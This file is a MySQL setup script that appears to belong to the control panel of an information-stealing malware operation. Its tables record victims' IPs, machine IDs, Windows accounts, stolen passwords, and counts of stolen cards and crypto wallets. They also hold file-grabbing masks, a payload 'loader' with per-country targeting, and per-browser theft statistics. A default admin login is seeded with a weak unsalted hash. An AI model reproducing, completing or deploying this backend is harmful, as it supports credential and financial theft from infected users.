SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";

CREATE TABLE `grab` (
  `UID` int(15) NOT NULL,
  `Name` text NOT NULL,
  `StartPath` text NOT NULL,
  `FileMasks` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `loader` (
  `UID` int(11) NOT NULL,
  `Name` text NOT NULL,
  `Status` int(11) NOT NULL,
  `Link` text NOT NULL,
  `Count` int(11) NOT NULL,
  `Success` int(11) NOT NULL,
  `DateAdded` datetime NOT NULL,
  `Countries` text NOT NULL,
  `DisabledCountries` text NOT NULL,
  `Domains` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `logs` (
  `UID` int(11) NOT NULL,
  `IP` text NOT NULL,
  `Country` text NOT NULL,
  `DateAdded` datetime NOT NULL,
  `FileName` text NOT NULL,
  `MachineID` text NOT NULL,
  `WinUser` text NOT NULL,
  `WinVer` text NOT NULL,
  `WinBit` text NOT NULL,
  `Passwords` mediumtext NOT NULL,
  `System` mediumtext NOT NULL,
  `CountPass` int(11) NOT NULL,
  `CountCards` int(11) NOT NULL,
  `CountCrypto` int(11) NOT NULL,
  `Duplicate` int(11) NOT NULL,
  `Comment` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `markers` (
  `UID` int(11) NOT NULL,
  `Name` text NOT NULL,
  `URLs` text NOT NULL,
  `Color` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `settings` (
  `Name` text NOT NULL,
  `Value` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `settings` (`Name`, `Value`) VALUES
('allow_duplicates', '1');

CREATE TABLE `statistics` (
  `Logs` int(30) NOT NULL,
  `Passwords` int(30) NOT NULL,
  `Chromium` int(30) NOT NULL,
  `Firefox` int(30) NOT NULL,
  `IE` int(30) NOT NULL,
  `Edge` int(30) NOT NULL,
  `Opera` int(30) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `statistics` (`Logs`, `Passwords`, `Chromium`, `Firefox`, `IE`, `Edge`, `Opera`) VALUES
(0, 0, 0, 0, 0, 0, 0);

CREATE TABLE `statitics_countries` (
  `Code` text NOT NULL,
  `Name` text NOT NULL,
  `Count` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `statitics_countries` (`Code`, `Name`, `Count`) VALUES
('AF', 'Afghanistan', 0),
('AX', 'Åland Islands', 0),
('AL', 'Albania', 0),
('DZ', 'Algeria', 0),
('AS', 'American Samoa', 0),
('AD', 'Andorra', 0),
('AO', 'Angola', 0),
('AI', 'Anguilla', 0),
('AG', 'Antigua and Barbuda', 0),
('AR', 'Argentina', 0),
('AM', 'Armenia', 0),
('AW', 'Aruba', 0),
('AU', 'Australia', 0),
('AT', 'Austria', 0),
('BS', 'Bahamas', 0),
('BH', 'Bahrain', 0),
('BD', 'Bangladesh', 0),
('BB', 'Barbados', 0),
('BE', 'Belgium', 0),
('BZ', 'Belize', 0),
('BJ', 'Benin', 0),
('BM', 'Bermuda', 0),
('BT', 'Bhutan', 0),
('BO', 'Bolivia (Plurinational State of)', 0),
('BQ', 'Bonaire, Sint Eustatius and Saba', 0),
('BA', 'Bosnia and Herzegovina', 0),
('BW', 'Botswana', 0),
('BV', 'Bouvet Island', 0),
('BR', 'Brazil', 0),
('IO', 'British Indian Ocean Territory', 0),
('BN', 'Brunei Darussalam', 0),
('BG', 'Bulgaria', 0),
('BF', 'Burkina Faso', 0),
('BI', 'Burundi', 0),
('CV', 'Cabo Verde', 0),
('KH', 'Cambodia', 0),
('CM', 'Cameroon', 0),
('CA', 'Canada', 0),
('KY', 'Cayman Islands', 0),
('CF', 'Central African Republic', 0),
('TD', 'Chad', 0),
('CL', 'Chile', 0),
('CN', 'China', 0),
('CX', 'Christmas Island', 0),
('CC', 'Cocos (Keeling) Islands', 0),
('CO', 'Colombia', 0),
('KM', 'Comoros', 0),
('CG', 'Congo (Republic of the)', 0),
('CD', 'Congo (Democratic Republic of the)', 0),
('CK', 'Cook Islands', 0),
('CR', 'Costa Rica', 0),
('CI', 'Côte d\'Ivoire', 0),
('HR', 'Croatia', 0),
('CU', 'Cuba', 0),
('CW', 'Curaçao', 0),
('CY', 'Cyprus', 0),
('CZ', 'Czech Republic', 0),
('DK', 'Denmark', 0),
('DJ', 'Djibouti', 0),
('DM', 'Dominica', 0),
('DO', 'Dominican Republic', 0),
('EC', 'Ecuador', 0),
('EG', 'Egypt', 0),
('SV', 'El Salvador', 0),
('GQ', 'Equatorial Guinea', 0),
('ER', 'Eritrea', 0),
('EE', 'Estonia', 0),
('ET', 'Ethiopia', 0),
('FK', 'Falkland Islands (Malvinas)', 0),
('FO', 'Faroe Islands', 0),
('FJ', 'Fiji', 0),
('FI', 'Finland', 0),
('FR', 'France', 0),
('GF', 'French Guiana', 0),
('PF', 'French Polynesia', 0),
('TF', 'French Southern Territories', 0),
('GA', 'Gabon', 0),
('GM', 'Gambia', 0),
('GE', 'Georgia', 0),
('DE', 'Germany', 0),
('GH', 'Ghana', 0),
('GI', 'Gibraltar', 0),
('GR', 'Greece', 0),
('GL', 'Greenland', 0),
('GD', 'Grenada', 0),
('GP', 'Guadeloupe', 0),
('GU', 'Guam', 0),
('GT', 'Guatemala', 0),
('GG', 'Guernsey', 0),
('GN', 'Guinea', 0),
('GW', 'Guinea-Bissau', 0),
('GY', 'Guyana', 0),
('HT', 'Haiti', 0),
('HM', 'Heard Island and McDonald Islands', 0),
('VA', 'Vatican City State', 0),
('HN', 'Honduras', 0),
('HK', 'Hong Kong', 0),
('HU', 'Hungary', 0),
('IS', 'Iceland', 0),
('IN', 'India', 0),
('ID', 'Indonesia', 0),
('IR', 'Iran', 0),
('IQ', 'Iraq', 0),
('IE', 'Ireland', 0),
('IM', 'Isle of Man', 0),
('IL', 'Israel', 0),
('IT', 'Italy', 0),
('JM', 'Jamaica', 0),
('JP', 'Japan', 0),
('JE', 'Jersey', 0),
('JO', 'Jordan', 0),
('KE', 'Kenya', 0),
('KI', 'Kiribati', 0),
('KP', 'Korea (Democratic People\'s Republic of)', 0),
('KR', 'Korea (Republic of)', 0),
('KW', 'Kuwait', 0),
('KG', 'Kyrgyzstan', 0),
('LA', 'Lao People\'s Democratic Republic', 0),
('LV', 'Latvia', 0),
('LB', 'Lebanon', 0),
('LS', 'Lesotho', 0),
('LR', 'Liberia', 0),
('LY', 'Libya', 0),
('LI', 'Liechtenstein', 0),
('LT', 'Lithuania', 0),
('LU', 'Luxembourg', 0),
('MO', 'Macao', 0),
('MK', 'Macedonia', 0),
('MG', 'Madagascar', 0),
('MW', 'Malawi', 0),
('MY', 'Malaysia', 0),
('MV', 'Maldives', 0),
('ML', 'Mali', 0),
('MT', 'Malta', 0),
('MH', 'Marshall Islands', 0),
('MQ', 'Martinique', 0),
('MR', 'Mauritania', 0),
('MU', 'Mauritius', 0),
('YT', 'Mayotte', 0),
('MX', 'Mexico', 0),
('FM', 'Micronesia (Federated States of)', 0),
('MD', 'Moldova (Republic of)', 0),
('MC', 'Monaco', 0),
('MN', 'Mongolia', 0),
('ME', 'Montenegro', 0),
('MS', 'Montserrat', 0),
('MA', 'Morocco', 0),
('MZ', 'Mozambique', 0),
('MM', 'Myanmar', 0),
('NA', 'Namibia', 0),
('NR', 'Nauru', 0),
('NP', 'Nepal', 0),
('NL', 'Netherlands', 0),
('NC', 'New Caledonia', 0),
('NZ', 'New Zealand', 0),
('NI', 'Nicaragua', 0),
('NE', 'Niger', 0),
('NG', 'Nigeria', 0),
('NU', 'Niue', 0),
('NF', 'Norfolk Island', 0),
('MP', 'Northern Mariana Islands', 0),
('NO', 'Norway', 0),
('OM', 'Oman', 0),
('PK', 'Pakistan', 0),
('PW', 'Palau', 0),
('PS', 'Palestine, State of', 0),
('PA', 'Panama', 0),
('PG', 'Papua New Guinea', 0),
('PY', 'Paraguay', 0),
('PE', 'Peru', 0),
('PH', 'Philippines', 0),
('PN', 'Pitcairn', 0),
('PL', 'Poland', 0),
('PT', 'Portugal', 0),
('PR', 'Puerto Rico', 0),
('QA', 'Qatar', 0),
('RE', 'Réunion', 0),
('RO', 'Romania', 0),
('RW', 'Rwanda', 0),
('BL', 'Saint Barthélemy', 0),
('SH', 'Saint Helena', 0),
('KN', 'Saint Kitts and Nevis', 0),
('LC', 'Saint Lucia', 0),
('MF', 'Saint Martin (French part)', 0),
('PM', 'Saint Pierre and Miquelon', 0),
('VC', 'Saint Vincent and the Grenadines', 0),
('WS', 'Samoa', 0),
('SM', 'San Marino', 0),
('ST', 'Sao Tome and Principe', 0),
('SA', 'Saudi Arabia', 0),
('SN', 'Senegal', 0),
('RS', 'Serbia', 0),
('SC', 'Seychelles', 0),
('SL', 'Sierra Leone', 0),
('SG', 'Singapore', 0),
('SX', 'Sint Maarten (Dutch part)', 0),
('SK', 'Slovakia', 0),
('SI', 'Slovenia', 0),
('SB', 'Solomon Islands', 0),
('SO', 'Somalia', 0),
('ZA', 'South Africa', 0),
('GS', 'South Georgia', 0),
('SS', 'South Sudan', 0),
('ES', 'Spain', 0),
('LK', 'Sri Lanka', 0),
('SD', 'Sudan', 0),
('SR', 'Suriname', 0),
('SJ', 'Svalbard and Jan Mayen', 0),
('SZ', 'Swaziland', 0),
('SE', 'Sweden', 0),
('CH', 'Switzerland', 0),
('SY', 'Syrian Arab Republic', 0),
('TW', 'Taiwan, Province of China', 0),
('TJ', 'Tajikistan', 0),
('TZ', 'Tanzania, United Republic of', 0),
('TH', 'Thailand', 0),
('TL', 'Timor-Leste', 0),
('TG', 'Togo', 0),
('TK', 'Tokelau', 0),
('TO', 'Tonga', 0),
('TT', 'Trinidad and Tobago', 0),
('TN', 'Tunisia', 0),
('TR', 'Turkey', 0),
('TM', 'Turkmenistan', 0),
('TC', 'Turks and Caicos Islands', 0),
('TV', 'Tuvalu', 0),
('UG', 'Uganda', 0),
('AE', 'United Arab Emirates', 0),
('GB', 'United Kingdom', 0),
('UM', 'United States Minor Outlying Islands', 0),
('US', 'United States of America', 0),
('UY', 'Uruguay', 0),
('VU', 'Vanuatu', 0),
('VE', 'Venezuela (Bolivarian Republic of)', 0),
('VN', 'Vietnam', 0),
('VG', 'Virgin Islands (British)', 0),
('VI', 'Virgin Islands (U.S.)', 0),
('WF', 'Wallis and Futuna', 0),
('EH', 'Western Sahara', 0),
('YE', 'Yemen', 0),
('ZM', 'Zambia', 0),
('ZW', 'Zimbabwe', 0);

CREATE TABLE `topsites` (
  `Host` text NOT NULL,
  `Count` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `login` text NOT NULL,
  `password` text NOT NULL,
  `dashboard` tinyint(1) NOT NULL,
  `logs` tinyint(1) NOT NULL,
  `loader` tinyint(1) NOT NULL,
  `grab` tinyint(1) NOT NULL,
  `markers` tinyint(1) NOT NULL,
  `users` tinyint(1) NOT NULL,
  `settings` tinyint(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `users` (`id`, `login`, `password`, `dashboard`, `logs`, `loader`, `grab`, `markers`, `users`, `settings`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', 1, 1, 1, 1, 1, 1, 1);

ALTER TABLE `grab`
  ADD PRIMARY KEY (`UID`);

ALTER TABLE `loader`
  ADD PRIMARY KEY (`UID`);

ALTER TABLE `logs`
  ADD PRIMARY KEY (`UID`);

ALTER TABLE `markers`
  ADD PRIMARY KEY (`UID`);

ALTER TABLE `topsites`
  ADD UNIQUE KEY `Host` (`Host`(50));

ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `grab`
  MODIFY `UID` int(15) NOT NULL AUTO_INCREMENT;

ALTER TABLE `loader`
  MODIFY `UID` int(11) NOT NULL AUTO_INCREMENT;

ALTER TABLE `logs`
  MODIFY `UID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;

ALTER TABLE `markers`
  MODIFY `UID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;

ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;
COMMIT;